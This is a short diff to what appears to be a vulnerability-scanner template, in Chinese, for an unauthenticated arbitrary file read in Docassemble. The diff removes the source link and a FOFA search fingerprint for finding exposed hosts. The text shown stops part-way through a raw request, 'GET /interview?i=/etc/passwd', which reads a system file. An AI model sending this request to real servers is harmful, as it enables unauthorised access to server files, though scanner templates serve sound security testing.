@@ -3,12 +3,8 @@ info:
   name: Docassemble interview 未授权任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fi80rm6oam0pll1n'
+  description: ''
   tags: lfi,unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fi80rm6oam0pll1n
-    fofa: icon_hash="-575790689"
 http:
 - raw:
   - 'GET /interview?i=/etc/passwd HTTP/1.1
